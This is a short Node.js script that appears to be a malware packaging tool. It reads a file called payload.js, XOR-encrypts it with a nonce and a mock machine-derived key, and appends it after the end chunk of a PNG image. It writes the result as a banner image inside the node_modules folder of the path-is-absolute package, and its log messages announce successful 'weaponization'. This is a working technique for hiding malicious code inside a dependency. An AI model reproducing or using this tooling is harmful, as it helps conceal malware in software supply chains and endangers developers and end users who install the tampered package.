
const fs = require('fs');

const path = require('path');

const crypto = require('crypto');



let payloadCode;

try {

    payloadCode = fs.readFileSync(path.join(__dirname, 'payload.js'), 'utf8');

} catch (e) {

    console.error("CRITICAL ERROR: payload.js not found.");

    process.exit(1);

}



const payloadBuffer = Buffer.from(payloadCode);



function encryptPayload(buffer) {

    const MOCK_KEY_SEED = 'mock-machine-id-mock-username';

    const MOCK_KEY = crypto.createHash('sha256').update(MOCK_KEY_SEED).digest();



    const nonce = crypto.randomBytes(16);



    const encryptedPayload = Buffer.alloc(buffer.length);



    for (let i = 0; i < buffer.length; i++) {

        encryptedPayload[i] = buffer[i] ^ MOCK_KEY[i % MOCK_KEY.length] ^ nonce[i % nonce.length];

    }



    return Buffer.concat([nonce, encryptedPayload]);

}



function stitch() {

    const inputPng = 'mml.png';

    const outputPng = path.join(__dirname, 'node_modules', 'path-is-absolute', 'banner.png');



    if (!fs.existsSync(inputPng)) {

        console.error(`[-] Error: Input PNG file '${inputPng}' not found.`);

        return;

    }



    const pngBuffer = fs.readFileSync(inputPng);

    

    const iendMarker = Buffer.from([0x49, 0x45, 0x4E, 0x44, 0xAE, 0x42, 0x60, 0x82]);

    const iendIndex = pngBuffer.lastIndexOf(iendMarker);



    if (iendIndex === -1) {

        console.error('[-] Error: IEND chunk marker not found in PNG file. Cannot embed payload.');

        return;

    }



    const splitPoint = iendIndex + 8;

    const header = pngBuffer.slice(0, splitPoint);

    

    const finalPayloadData = encryptPayload(payloadBuffer);

    

    const finalBuffer = Buffer.concat([header, finalPayloadData]);

    fs.writeFileSync(outputPng, finalBuffer);

    

    console.log('[+] Weaponization Succeeded with polymorphic encryption.');

    console.log(`[+] Encrypted payload from 'payload.js' has been embedded into '${outputPng}'.`);

}



stitch();
